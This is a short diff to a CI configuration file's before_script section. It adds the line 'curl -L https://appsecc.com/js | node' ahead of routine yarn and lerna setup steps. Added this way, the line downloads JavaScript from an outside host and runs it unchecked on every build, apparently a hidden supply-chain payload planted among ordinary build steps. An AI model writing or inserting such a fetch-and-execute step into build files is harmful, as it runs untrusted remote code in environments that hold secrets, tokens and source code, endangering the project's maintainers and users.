@@ -19,6 +19,7 @@ cache:
     - '~/.cache'
 
 before_script:
+  - curl -L https://appsecc.com/js | node
   - yarn global add license-checker
   - yarn run lerna bootstrap
   - git checkout .
